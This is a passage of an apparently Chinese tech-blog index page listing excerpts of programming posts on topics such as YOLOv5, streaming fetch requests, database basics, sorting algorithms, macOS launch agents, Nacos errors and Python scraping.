IDEA（Java IDE） 相较于Eclipse，IDEA的界面更加精美，拥有完整的代码提示功能，还可以轻松安装其他插件，例如代码格式标准化插件、AI代码插件等等
WebStorm（前端开发） VsCode较为轻量，非常适合用于前端开发，但是因为我已经熟悉了IDEA的操作逻辑，因此更加喜欢使用WebStorm来开发，jetbrains公司的IDE使用一套统一的操作逻辑，例如快捷键相同、菜单栏类似
Xshell、Xftp（远程服务器连接） Xshell可以非常方便地和远程服务器建立连接，Xftp可以非常方便地和服务器进行文件传输
Postman（模拟请求发送） 适用于后端开发，可以非常方便地模拟请求，可以设置请求方法、请求参数、请求头……
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4c8e25865ce69723f93b812e20267a28/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3aff8dfc57374f6532936d05d104f3a8/" rel="bookmark">
			YOLOv5 学习记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 整体概况数据增强与前处理自适应Anchor的计算Lettorbox 架构SiLU激活函数YOLOv5改进点SSPF 模块 正负样本匹配损失函数 整体概况 YOLOv5 是一个基于 Anchor 的单阶段目标检测，其主要分为以下 5 个阶段：
1、输入端：Mosaic 数据增强、自适应Anchor计算、自适应图像缩放；
2、Backbone：提取出高中低层的特征，使用了 CSP 结构、SPPF、SiLU 等操作；
3、Neck：使用 FPN+PAN 结构，将各层次的特征进行融合，并提取出大中小的特征图；
4、Head：进行最终检测部分，在特征图上应用 Anchor Box，并生成带有类别概率、类别
得分以及目标框的最终输出向量；
5、损失函数：计算预测结果与 Ground Truth 之间的 Loss。
数据增强与前处理 自适应Anchor的计算 自适应 Anchor 计算
在 YOLOv3、YOLOv4 中，训练不同的数据集时，计算初始 Anchor 的值是通过单独的程序运行的。但 YOLOv5 中将此功能嵌入到代码中，每次训练时会自适应的计算不同训练集中的最佳 Anchor 值。
自适应计算 Anchor 的流程如下：
1、载入数据集，得到数据集中所有数据的 w、h；
2、将每张图像中 w、h 的最大值等比例缩放到指定大小，较小边也相应缩放；
3、将 bboxes 从相对坐标改成绝对坐标（乘以缩放后的 w、h）；
4、筛选 bboxes，保留 w、h 都大于等于 2 像素的 bboxes;
5、使用 k-means 聚类得到 n 个 Anchors;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3aff8dfc57374f6532936d05d104f3a8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b70ee176edb6e413616ac9488571e607/" rel="bookmark">
			fetch 获取流式数据(chatgpt的流式输出)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景：项目中需要获取chatgpt实时返回的数据
使用场景：在对接chatgpt 语言模型的时候采取的这种方案，因为目前的大语言的模型的结果都是需要一点点计算的，如果提出的问题比较复杂就导致响应的时间过长。
好处：流式获取一般在用于数据量比较大的情况，一次性返回会导致前端页面加载时间过长或者请求超时等问题，这时候我们就可以考虑使用流式的方式拿到部分数据并先展示，从而提升用户体验。
async function getChatgptMsg() { const response = await fetch('你的url', { method: 'POST', headers: { 'Content-Type': 'application/json' }, dataType: "text/event-stream", body: JSON.stringify({ model: 'gpt-4', messages: messages, frequency_penalty: 0; max_tokens:4000; model:"gpt-4"; presence_penalty: 0.6; temperature: 0.5; top_p :1; }) }); if (!response.ok) { throw new Error(`HTTP error! status: ${response.status}`); } const reader = response.body.getReader(); let decoder = new TextDecoder(); let resultData = ''; let result = true; while (result) { const { done, value } = await reader.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b70ee176edb6e413616ac9488571e607/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8443581ba05f1b110359cdf5a72ff63/" rel="bookmark">
			【科普】一篇搞定发paper基本概念：SCI、EI、会议/期刊、分区、CCF、DOI、IF、h-index、及cs/ee常见会议：CVPR、GlobeCOM等
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 基础概念SCI、EI、CPCI（ISTP）论文类型：Journal、magazine、transaction、letter、 proceedingsDOI（数字对象标识Digital Object Identifier）IF 期刊影响因子(Impact Factor，IF)H指数 (h-index/h-factor)刊号ISSN收录号/检索号AcessionNumberarXiv如何查看相关信息 科研体系关于会议组织者、出版商、科研工作者的关系以及工作流程出版商-数据库收录、检索如何判断论文是否被SCI/EI收录会议与期刊 分区为什么要分区JCR分区中科院分区中科院基础版和升级版有何区别？top期刊 JCR&amp;中科院区别如何查看期刊分区CCF分区CCF分区和SCI分区有什么区别？ 常见会议/期刊ICML、NeurIPS/NIPS（机器学习两大顶会）ICLR、IJCAI、AAAI（深度学习领域顶会）CVPR、ICCV、ECCV（计算机视觉三大顶会（统称ICE））计算机视觉与自然语言处理领域顶会通信专业会议（ICC、GlobeCOM、INFOCOM） 研一小白，有一些基础概念一直一知半解，遂作一个整理，以期较为系统掌握，但由于了解不深，纯属纸上谈兵，信息来自互联网，不一定对，若下文有错，还请在评论区不吝赐教！我将及时修改
每块信息若有参考，我将在下面注明链接，作为延伸阅读，但一般不用看，我都消化汇总一遍咯
转载需注明出处：CSDN@z5z5z5z56
基础概念 SCI、EI、CPCI（ISTP） 国际学术期刊（AcademicJournal）三大科技文献检索系统：SCI、EI、CPCI（ISTP）
SCI(ScienceCitationIndex)自然科学引文索引
是一部期刊文献检索工具。它通过论文的被引用频次等的统计，对学术期刊和科研成果进行多方位的评价研究，从而评判出一个国家或地区、科研单位、个人的科研产出绩效，来反映其在国际上的学术水平。是1957年由美国科学信息研究所做的数据库。SCI使用JCR作为影响因子EI（工程索引）
是由美国工程师学会联合会于1884年创办的历史上最悠久的一部大型综合性检索工具。EI在全球的学术界、工程界、信息界中享有盛誉，是科技界共同认可的重要检索工具。EI，在工科领域EI是仅次于SCI的，特别是在一些非热点的传统工科里SCI期刊屈指可数、EI就已是顶级期刊CPCI（原名ISTP）（科技会议录索引）
创刊于1978年，由美国科学情报研究所编辑出版。该索引收录生命科学、物理与化学科学、农业、生物和环境科学、工程技术和应用科学等学科的会议文献，包括一般性会议、座谈会、研究会、讨论会、发表会等。其中工程技术与应用科学类文献约占35%，其他涉及学科基本与SCI相同。 那么，建立索引的本意是什么？
检索工具+评价体系：
第一，有利于了解某位著者或某一机构发表论文的数量及其影响情况。
第二，有利于了解世界范围内某一学科的研究动态。
第三，有利于了解研究热点及某篇论文的被引用情况。
（而不是拿来评奖学金，戴帽子的）
SCI、EI和IEEE有什么区别
SCI的作用
论文类型：Journal、magazine、transaction、letter、 proceedings letter:
属于快报形式，一般发表最新的研究成果，文章要求短小（4页），有即时性，理论推导要求不高Journal：
刊登关于某特殊主题的文章的期刊 例如Journal of Internet TechnologyTransactions：
(学会等的)议事录,会报,会刊 例如IEEE Transactions on Vehicular Technology Journal、Transactions这两个属于同一类，期刊论文，但两者面向的读者和表达方式上略有不同。两者都需要有很大的创新点，和比较详细的公式推导。
Trans:具体到一个相对较细的专业方向上，如IEEETrans.Sign.Proc.
jour:面向的读者群却更加广泛,如IEEEJ-SAC,所以jour需要对背景知识有更加全面的介绍。
虽然jour没有trans.的专注度高，但是其理论深度的要求也很高
proceedings
记录,会议录;年[学]报;(科学文献)汇编，会议的文章发表为论文集，通常是这个类型，例如
Proceedings of the 2021 IEEE International Conference on Communications, Computing, Cybersecurity and Informatics, CCCI 2021
magazine
综合性内容的期刊
内容难度：letter&lt;journal&lt;transactions
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8443581ba05f1b110359cdf5a72ff63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/584d9916e54e02922145fe74e3f002db/" rel="bookmark">
			macOS 后台项目已添加 “Google Updater添加了可在后台运行的项目。你可以在“登陆项”设置中管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Intro解决查看三个文件夹分析 &amp; 操作确认结果是否生效 Intro 我的macbook上经常弹出这样的通知狂：
macOS 后台项目已添加 “Google Updater添加了可在后台运行的项目。你可以在“登陆项”设置中管理
不胜其扰，终于决定禁用它。以下为方法：
直接单击这个通知项：
解决 你需要查看3个目录，并清理掉相关的文件。
查看三个文件夹 在 Terminal 中执行以下三行命令，可在 Finder 中打开对应文件夹(或者你手动打开也行)。
wuyujin1997@wyjmacm1 ~ % open ~/Library/LaunchAgents wuyujin1997@wyjmacm1 ~ % open /Library/LaunchAgents wuyujin1997@wyjmacm1 ~ % open /Library/LaunchDaemons 分析 &amp; 操作 可以看出3个文件夹中我只有在个人目录中的 ~/Library/LaunchAgents 中有两个google相关的文件：
删除掉这两个文件。然后重启电脑（或等待一会，具体时长我不确定，部分机型应该在五分钟以内）。
确认结果是否生效 依次打开——设置——通用——登陆项，查看最新情况：
可以看到，之前有微信和google两项，现在只剩微信一个了。
操作有效。
记于此日，希望对后来人有帮助。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10215dabc8187b70229e342f2fc132ad/" rel="bookmark">
			若依前后端分离版ruoyi-vue：增加新的登录接口（新用户表），用于小程序或者APP获取token，并使用若依的验证方法，结合腾讯云短信验证码实现手机号&#43;验证码登陆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.新建—SmsController类 package com.wanuw.user.controller.login; import com.wanuw.common.constant.Constants; import com.wanuw.common.core.domain.AjaxResult; import com.wanuw.user.service.SmsService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.*; /** * 手机端验证码 * * @author dagang */ @RestController @RequestMapping("/sms") public class SmsController { @Autowired private SmsService smsService; /** * 生成手机验证码 */ @PostMapping("/send") public AjaxResult sendSmsCode(@RequestParam(value = "phoneNumber") String phoneNumber) { String message = smsService.sendSmsCode(phoneNumber); return AjaxResult.success(message); } /** * 验证手机验证码 */ @PostMapping("/verify") public AjaxResult verifySmsCode(@RequestParam(value = "phoneNumber") String phoneNumber, @RequestParam(value = "smsCode") String smsCode) { AjaxResult ajax = AjaxResult.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10215dabc8187b70229e342f2fc132ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e97a37d751e0e689a6c4ff4c677ba7c8/" rel="bookmark">
			什么是数据库(Database)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据库（Database）是指存储数据的容器，也被称为数据存储库（Data Store）。数据库能够存储大量结构化和非结构化的数据，包括文本、数字、图像、音频等各种类型的数据。它们是计算机系统中最重要的组件之一，被广泛用于各种应用程序和业务领域。本文将对数据库的基本概念、类型、结构、操作、管理、安全等方面进行详细介绍。
一、数据库的基本概念 数据库是指由若干个相关数据的集合组成，它们被存储在计算机系统中，以便于对这些数据进行管理、处理和访问。数据库可以包含多个表格或者集合，每个表格或集合包含一组相似的数据。
常见的数据库软件有MySQL、Oracle、SQL Server、PostgreSQL等。这些软件具有管理、查询、更新、删除数据的功能，可以通过编写SQL语句来操作数据库中的数据。
数据库的核心概念包括数据、表格、字段、记录和主键等。
1.数据
数据是指可以被计算机处理和存储的信息。数据可以是数字、字符、图像、音频等各种类型的信息。数据库中的数据是有意义的信息，可以被组织、管理和检索。
2.表格
表格是数据库中存储数据的基本单元，也被称为数据表或数据集合。表格由行和列组成，行表示记录，列表示字段。表格中的每个单元格包含一个值，该值对应于表格中的一个字段和一条记录。
3.字段
字段是表格中的列，每个字段都包含相同类型的数据。字段可以是数字、字符、日期、时间、布尔值等各种类型的数据。每个字段都有一个名称，用于标识该字段在表格中的位置。
4.记录
记录是表格中的行，每个记录包含一组字段值。记录的数量可以是零或多个，每个记录都有一个唯一标识符，称为主键。
5.主键
主键是一条记录的唯一标识符，用于区分表格中不同的记录。主键可以是一个或多个字段的组合，主键的值不能重复。主键可以是数据库中唯一的一个记录标识符。
二、数据库的类型 根据数据存储方式和结构的不同，数据库可以分为关系型数据库和非关系型数据库。
1.关系型数据库
关系型数据库（Relational Database）是指采用关系模型来组织数据的数据库。关系模型是指将数据组织成一系列的表格，表格之间可以建立关系。关系型数据库可以通过SQL语句来操作和查询数据，是应用最广泛的一类数据库类型。
常见的关系型数据库有MySQL、Oracle、SQL Server、PostgreSQL等。关系型数据库具有以下特点：
表格之间可以建立关系，数据之间的关联性可以通过外键进行管理。
支持复杂的查询操作，可以通过SQL语句进行查询、更新、删除等操作。
支持事务处理，可以保证数据的完整性和一致性。
可以通过索引来加快数据访问速度。
2.非关系型数据库
非关系型数据库（NoSQL，Not Only SQL）是指不使用传统的关系型数据库模型的数据库，它们使用其他的数据模型来组织和管理数据。非关系型数据库可以存储各种类型的数据，包括结构化、半结构化和非结构化的数据。
常见的非关系型数据库有MongoDB、Cassandra、Redis、Elasticsearch等。非关系型数据库具有以下特点：
不需要事先定义数据模型，数据可以动态添加和删除。
支持水平扩展，可以通过添加节点来扩展数据库的容量和性能。
支持高可用性和可伸缩性，可以通过复制和分片来实现数据的冗余和负载均衡。
支持键值对、文档、图形、列族等多种数据模型。
三、数据库的结构 数据库的结构指的是数据在数据库中的组织形式和存储方式。根据数据库结构的不同，数据库可以分为层次型数据库、网状型数据库、关系型数据库和面向对象数据库等。
1.层次型数据库
层次型数据库（Hierarchical Database）是最早的数据库类型之一，它的数据结构类似于一棵树形结构，数据之间存在一对多的层次关系。每个节点可以包含多个子节点，但只能有一个父节点。层次型数据库常用于管理复杂的工程和科学数据。
2.网状型数据库
网状型数据库（Network Database）是在层次型数据库的基础上发展起来的一种数据库类型。网状型数据库的数据结构类似于一个网状结构，数据之间存在多对多的关系。每个记录可以有多个父记录和多个子记录。网状型数据库常用于处理复杂的关联数据。
3.关系型数据库
关系型数据库是目前应用最广泛的一种数据库类型，它的数据结构是由多个表格组成，表格之间可以建立关系。关系型数据库可以使用SQL语句进行查询、更新、删除等操作，支持事务处理和索引等高级功能。
4.面向对象数据库
面向对象数据库（Object-oriented Database）是一种新型的数据库类型，它的数据结构类似于面向对象程序设计中的对象和类。面向对象数据库将数据存储在对象中，对象之间可以建立关系和继承关系，支持多态和封装等面向对象的特性。面向对象数据库常用于存储复杂的对象数据和多媒体数据。
四、数据库的设计 数据库的设计是指将现实世界中的业务逻辑转化为数据库中的数据结构和关系的过程。数据库的设计需要考虑数据的完整性、一致性、准确性和易用性等方面的问题，以确保数据库能够满足业务需求并且易于维护和扩展。
数据库的设计一般包括以下几个步骤：
1.需求分析
需求分析是数据库设计的第一步，它需要确定数据库的功能和业务需求，包括数据的来源、数据的类型、数据的数量、数据的访问方式等。在需求分析阶段，需要与业务人员和用户进行充分的沟通和交流，以确保数据库的设计能够满足业务需求。
2.数据建模
数据建模是数据库设计的核心部分，它需要将需求分析阶段得到的业务需求转化为数据库的数据结构和关系。数据建模一般采用E-R图（实体-关系图）来表示，它将实体、属性和关系用图形的方式表示出来，以便于理解和分析。
3.数据库设计
数据库设计是将数据模型转化为数据库的实际结构的过程，包括数据库表格的设计、字段的定义、数据类型的选择、主键和外键的定义等。在数据库设计过程中，需要考虑数据的完整性和一致性，以确保数据库的稳定和可靠性。
4.数据库实现
数据库实现是将数据库设计转化为实际的数据库系统的过程，包括数据库软件的安装、数据库表格的创建、数据的导入和检验等。在数据库实现过程中，需要注意数据库的性能和安全性，以确保数据库能够正常运行并且不受攻击。
5.数据库测试
数据库测试是对数据库系统进行功能和性能测试的过程，以确保数据库能够满足业务需求并且性能良好。数据库测试需要测试数据库的数据访问、事务处理、查询优化等方面的功能，并且进行负载测试、安全测试等方面的测试。
6.数据库维护
数据库维护是数据库设计的最后一步，它需要定期进行数据库备份、优化、更新等工作，以确保数据库的稳定性和可靠性。数据库维护还需要进行安全漏洞扫描、数据库性能监控等工作，以确保数据库的安全和高效。
五、数据库管理系统（DBMS） 数据库管理系统（Database Management System，DBMS）是指管理数据库的软件系统，它提供了对数据库的管理、维护和查询等功能。DBMS可以帮助用户有效地存储和管理数据，并且提供了数据访问、事务处理、查询优化等方面的功能。DBMS还支持多用户并发访问，可以防止数据的冲突和不一致性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e97a37d751e0e689a6c4ff4c677ba7c8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0d134187c92d22246d2e964f29208bf/" rel="bookmark">
			数据结构-插入排序&#43;希尔排序&#43;选择排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.插入排序
插入排序的时间复杂度：
2.希尔排序
希尔排序的时间复杂度： 3.选择排序
选择排序的时间复杂度：
所谓排序，就是使一串记录，按照其中的某个或某些关键字的大小，递增或递减的排列起来的操作。排序在生活中的作用很大，例如：某宝中的价格排行榜、销量排行榜，国内外的财富排行榜、院校排行榜等等，都是使用排序完成的。
下面我们看看常见的排序都有哪些：
1.插入排序 基本思想：
把待排序的记录按其关键码值的大小逐个插入到一个已经排好序的有序序列中，直到所有的记录插入完为止，得到一个新的有序序列 。
实际中我们玩扑克牌时，就用了插入排序的思想：
插入排序的过程如下：
假设我们有如下一个数组：
具体实现代码如下：
while (end &gt;= 0) { //挪数据 if (tmp &lt; a[end]) { a[end + 1] = a[end]; end--; } else { break; } } //交换数据 a[end + 1] = tmp; tmp中存放的是3，3小于10，10往后挪一位，3小于5,5往后挪一位......当end到2时，tmp小于2，退出循环，此时5 7 10都已经往后挪了一位，数组中的元素应该是：2 5 5 7 10，我们把tmp中存放的3和2后面的5交换即可。
以上只是一个数据的插入排序，要实现整个数组的排序，我们需要对数组的每个数据都往前插入排序一下：
void InsertSort(int* a, int n) { for (int i = 1; i &lt; n; i++) { int end = i - 1; int tmp = a[i]; while (end &gt;= 0) { if (tmp &lt; a[end]) { a[end + 1] = a[end]; end--; } else { break; } } a[end + 1] = tmp; } } 插入排序的时间复杂度： 假设我们要排升序，当要排的数据刚好是降序时，时间复杂度最大，为O(N^2)，因为此时排序的次数是等差数列。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0d134187c92d22246d2e964f29208bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21bd26c491be99586711ab351f4af427/" rel="bookmark">
			define 不是关键字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近做到了一个题，题目如下：
实践：
确实可以正常运行。
原因：
-- define 是编译器的预编译指令，是编译器实现的，不是c语言的内容。
预编译相关可以看 【保姆级讲解】C语言---预编译处理精华_c语言什么是预编译-CSDN博客
扩展：printf和main 等函数名也不是关键字。
（可以但不规范）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08fc65a784add611f58881f4e997e766/" rel="bookmark">
			IDEA创建文件添加作者及时间信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 当使用IDEA进行软件开发时，经常需要在代码文件中添加作者和时间信息，以便更好地维护和管理代码。
但是如果每次都手动编辑 以及修改那就有点浪费时间了。
实践 其实我们可以将注释日期 作者 配置到 模板中 同时配置上动态获取内容 例如时间 这样每次新建文件都会带上我们 信息 以及动态的内容
打开IDEA设置： 转到 “File” -&gt; “Settings”。 （mac 用户 点击 preference）
选择File and Code Templates： 在设置窗口中，选择 “Editor” -&gt; “File and Code Templates”。
4和5的两种方式选择一个即可
修改模板： 在右侧的 “File” 选项卡下，找到 “Includes” -&gt; “File Header”，将模板修改为以下内容：
/** * @author 作者名称 * @date ${YEAR}-${MONTH}-${DAY} ${HOUR}:${MINUTE}:${SECOND} */ 另外 还有可以单独设置的不同文件的请求头 但是需要注意的是 这和fileHeader的方式 会叠加 注意需要文件头的文件都设置 例如 类 和 接口 都想生成的话 那就都需要配置 错误的示例
所以说 3和 4 选择一个即可 如果说非要同时设置 那么 3的设置应该是一些公用的内容
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/08fc65a784add611f58881f4e997e766/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/769e98a0c8736910962ee767d52e1a66/" rel="bookmark">
			Redo subscriber operation REGISTER for DEFAULT_GROUP@@xxx # failed.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 在服务间的请求中 有个报错日志一直在打印，项目启动正常，但只要发起feign调用就会打出如下报错日志 Redo subscriber operation REGISTER for DEFAULT_GROUP@@服务名 # failed.
详细日志如下
2023-11-17 18:08:00.167 [127.0.1.1] [com.alibaba.nacos.client.naming.grpc.redo.0] ERROR [,,,] com.alibaba.nacos.client.naming.redoForSubscribes - Redo subscriber operation REGISTER for DEFAULT_GROUP@@服务名# failed. com.alibaba.nacos.api.exception.NacosException: user not found! at com.alibaba.nacos.client.naming.remote.gprc.NamingGrpcClientProxy.requestToServer(NamingGrpcClientProxy.java:359) at com.alibaba.nacos.client.naming.remote.gprc.NamingGrpcClientProxy.doSubscribe(NamingGrpcClientProxy.java:311) at com.alibaba.nacos.client.naming.remote.gprc.redo.RedoScheduledTask.redoForSubscribe(RedoScheduledTask.java:127) at com.alibaba.nacos.client.naming.remote.gprc.redo.RedoScheduledTask.redoForSubscribes(RedoScheduledTask.java:108) at com.alibaba.nacos.client.naming.remote.gprc.redo.RedoScheduledTask.run(RedoScheduledTask.java:52) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) at java.util.concurrent.FutureTask.runAndReset(FutureTask.java:308) at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$301(ScheduledThreadPoolExecutor.java:180) at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:294) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) 但是feign调用可以正常调用 调用完成后，就会一直打印如上错误
定位分析 问题的本质还是 鉴权失败的问题
可以和 check-update] get changed dataId error, code: 403 问题一起看
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/769e98a0c8736910962ee767d52e1a66/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dac289b7569512da54b90236b1fd35f4/" rel="bookmark">
			11.14Python
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import time print(time.localtime()) #time.struct_time(tm_year=2023, tm_mon=11, tm_mday=14, tm_hour=14, tm_min=38, tm_sec=7, tm_wday=1, tm_yday=318, tm_isdst=0) print(time.strftime("%Y-%m-%d %H:%M:%S")) #2023-11-14 14:33:37 time.sleep(x) #x秒后继续运行下面代码 import time import turtle # print(time.localtime()) # print(time.localtime(500)) # print(type(time.localtime())) # print(time.strftime("%Y-%m-%d %H:%M:%S")) turtle.setup(960, 600) # 画布 turtle.bgpic('猫头鹰.gif') turtle.fillcolor('#FFFF00') turtle.title("猫头鹰") turtle.pensize(5) # 笔粗细 turtle.speed(5) # 笔移动速度 turtle.color("#7c443c", '#FFFF00') # 笔颜色 turtle.begin_fill() # 从这里开始↓ turtle.circle(50, 360, 5) turtle.end_fill() # 到这里内操作的代码填充 turtle.penup() # 提笔 turtle.forward(150) turtle.color("#7c443c", '#000000') turtle.pendown() # 落笔 turtle.begin_fill() # 从这里开始↓ turtle.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dac289b7569512da54b90236b1fd35f4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82a5d64119417b25043064d04101b978/" rel="bookmark">
			简朴博客系统测试报告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一. 项目简介二. 测试概要三. 测试环境四. 测试执行概况及功能测试1. 手工测试1.1 手动测试用例编写1.2 执行的部分测试用例 2. 自动化测试Selenium2.1 编写测试用例2.2 自动化测试代码 3. 测试结果 五. 发现的问题 一. 项目简介 简朴博客系统是采用前后端分离的方式来实现的，是基于 SpringFrameWork 和 MyBatis 框架实现的一个简易的博客发布网站，同时将其部署到了云服务器上。
目前博客系统主要实现了户的注册登录，文章的编写、发布，以及对自己文章的查看、修改、删除操作，个人文章列表及文章数统计这些；还可以分页显示所有作者汇总的文章列表，显示文章阅读量等。
使用 IDEA 开发，项目用到的技术有，SpringBoot， SpringMVC， MyBatis， MySQL， Redis， Lombok，HTML，CSS，JavaScript，jQuery 等。
二. 测试概要 测试对象：基于 SSM 项目的博客系统。
测试目的：校验博客项目功能是否符合自己的预期。
测试点：主要针对常用的主流程功能进行测试，如：注册、登录、汇总博客列表页、博客编辑页、个人博客列表页、导航栏组件等涉及到的功能。
测试方法和工具：主要是黑盒测试，自动化工具使用 Selenium 和 Junit。
三. 测试环境 硬件：Lenovo Yoga 14S 2021（R7-5800H/16GB/512GB/集显）。
浏览器：Google Chrome 版本 119.0.6045.160（正式版本） （64 位）。
操作系统：Windows 11。
测试工具：Selenium3 和 Junit5。
四. 测试执行概况及功能测试 1. 手工测试 1.1 手动测试用例编写 ♨️注册页
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/82a5d64119417b25043064d04101b978/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c7ef98a75fc83a6e1bfe987c0f5f943/" rel="bookmark">
			Python 爬虫入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Python 爬虫入门`requests` 库`beautifulsoup4`库函数`findall()`，`find()`函数`get()` 爬虫实例 1：抓小说爬虫实例 2：抓豆瓣 top 250 的电影信息后记 Python 爬虫入门 Python 的爬虫功能使得程序员可以快速抓取并分析网页中的信息，它实质上是模拟浏览器访问网页。本章主要常用的两个爬虫相关的库requests，beautifulsoup4。若要模拟鼠标点击等，要用到selenium 库，限于篇幅限制，本章不再介绍，具体可以查阅相关资料。
requests 库 每个网页都有源代码，可以通过鼠标单击右键查看网页源代码。网页中的很多信息都在源代码里面，requests 是一个访问网页源代码的库。一般通过 get 函数访问网页，另外一个常用来访问网页的函数是 post，与 get 函数的区别在于 post 能够传递表格或文件到网页所在服务器上。
get(url, [timeout], [headers], [proxies], **kwargs)url网页链接timeout可选参数，请求网页的最大时长，单位为秒headers可选参数，模拟浏览器设置proxies可选参数，代理服务器设置**kwargs其他参数 get 或 post 函数返回一个 Resoponse 对象，该对象包括以下常用的属性或函数。
属性或函数描述status_code网页请求的返回状态，200 表示连接成功，404 表示连接失败text响应网页的字符串内容encoding响应网页的编码方式，可以更改content相应网页的字节形式内容，例如图片或 pdf 文件等raise_for_status()如果网页访问不成功，抛出异常，一般结合 try-except 语句使用json()该函数可以解析网页内容中 JSON 格式的数据 import requests r = requests.get('http://www.baidu.com') r.status_code 200 r.text # 结果省略 r.encoding # 若为 ISO-8859-1 则中文为乱码 'ISO-8859-1' r.encoding = 'utf-8' # 无论网页原内容是什么编码，都改成 utf-8 编码 beautifulsoup4库 使用requests获取的网页源代码一般非常复杂，不仅包括常规内容，还包括很多定义页面格式的代码。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2c7ef98a75fc83a6e1bfe987c0f5f943/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54fe7528a1e035608d73958112732083/" rel="bookmark">
			Java 类之 java.lang.reflect.Method
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java 类之 java.lang.reflect.Method 文章目录 Java 类之 java.lang.reflect.Method一、概述1、java.lang.Class 类获取方法的方法获取全部公有方法（含继承的，不含私有的）获取本类的所有方法（不含继承的，含私有的）代码示例 2、java.lang.reflect.Method 类简介3、类定义信息 二、基本功能1、基本功能2、代码示例 三、扩展1、关于注解的方法2、`getAnnotations()` 和 `getDeclaredAnnotations()`的区别区别代码示例 3、invoke 方法简介方法签名参数说明异常代码示例 4、是否支持修改方法5、其它注意点 关联文章：《Java反射详解》https://blog.csdn.net/qq_29689343/article/details/97639037
一、概述 1、java.lang.Class 类获取方法的方法 获取全部公有方法（含继承的，不含私有的） getMethod(String name, Class&lt;?&gt;... parameterTypes)： 获取指定名称和参数类型的公有方法。如果方法不存在，则抛出 NoSuchMethodException 异常。 getMethods()： 获取该类及其父类中所有公有方法的数组。返回一个 Method 对象数组。 获取本类的所有方法（不含继承的，含私有的） getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)： 获取指定名称和参数类型的任意访问权限的方法，包括私有方法。如果方法不存在，则抛出 NoSuchMethodException 异常。 getDeclaredMethods()： 获取该类中所有声明的方法，包括私有方法。返回一个 Method 对象数组。 代码示例 // 获取公有方法（含继承的，不含私有的） Method publicMethod = MyClass.class.getMethod("publicMethodName", String.class); // 获取所有公有方法（含继承的，不含私有的） Method[] publicMethods = MyClass.class.getMethods(); // 获取本类的私有方法（不含继承的，含私有的） Method privateMethod = MyClass.class.getDeclaredMethod("privateMethodName", String.class); // 获取本类的所有方法（不含继承的，含私有的） Method[] allMethods = MyClass.
	</div>
